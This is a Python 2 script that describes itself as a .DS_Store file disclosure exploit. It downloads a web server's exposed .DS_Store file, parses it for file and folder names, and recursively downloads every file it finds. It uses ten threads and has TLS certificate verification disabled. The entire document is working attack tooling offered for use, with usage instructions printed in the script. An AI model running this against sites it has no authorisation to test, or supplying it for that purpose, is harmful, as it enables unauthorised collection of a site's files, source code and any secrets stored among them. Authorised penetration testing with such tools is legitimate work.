#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# LiJieJie    my[at]lijiejie.com    http://www.lijiejie.com

import sys
import urllib2
import cStringIO
import urlparse
import os
import Queue
import ssl
import threading
from ds_store import DSStore

context = ssl._create_unverified_context()


class Scanner(object):
    def __init__(self, start_url):
        self.queue = Queue.Queue()
        self.queue.put(start_url)
        self.processed_url = set()
        self.lock = threading.Lock()
        self.working_thread = 0

    def process(self):
        while True:
            try:
                url = self.queue.get(timeout=2.0)
                self.lock.acquire()
                self.working_thread += 1
                self.lock.release()
            except Exception as e:
                if self.working_thread == 0:
                    break
                else:
                    continue
            try:
                if url in self.processed_url:
                    pass
                else:
                    self.processed_url.add(url)
                base_url = url.rstrip('.DS_Store')
                if not url.lower().startswith('http'):
                    url = 'http://%s' % url
                schema, netloc, path, _, _, _ = urlparse.urlparse(url, 'http')
                try:
                    response = urllib2.urlopen(url, context=context)
                except Exception, e:
                    if hasattr(e, 'code') and  e.code != 404:
                        self.lock.acquire()
                        print '[%s] %s' % (e.code, url)
                        self.lock.release()
                    continue

                data = response.read()

                if response.code == 200:
                    folder_name = netloc.replace(':', '_') + '/'.join(path.split('/')[:-1])
                    if not os.path.exists(folder_name):
                        os.makedirs(folder_name)
                    with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                        self.lock.acquire()
                        print '[%s] %s' % (response.code, url)
                        self.lock.release()
                        outFile.write(data)
                    if url.endswith('.DS_Store'):
                        ds_store_file = cStringIO.StringIO()
                        ds_store_file.write(data)
                        d = DSStore.open(ds_store_file)

                        dirs_files = set()
                        for x in d._traverse(None):
                            dirs_files.add(x.filename)
                        for name in dirs_files:
                            if name != '.':
                                self.queue.put(base_url + name)
                                self.queue.put(base_url + name + '/.DS_Store')
                        d.close()
            except Exception as e:
                self.lock.acquire()
                print '[!] %s' % str(e)
                self.lock.release()
            finally:
                self.working_thread -= 1

    def scan(self):
        all_threads = []
        for i in range(10):
            t = threading.Thread(target=self.process)
            all_threads.append(t)
            t.start()


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print 'A .DS_Store file disclosure exploit.'
        print 'It parses .DS_Store and downloads file recursively.'
        print
        print '    Usage: python ds_store_exp.py http://www.example.com/.DS_Store'
        sys.exit(0)
    s = Scanner(sys.argv[1])
    s.scan()
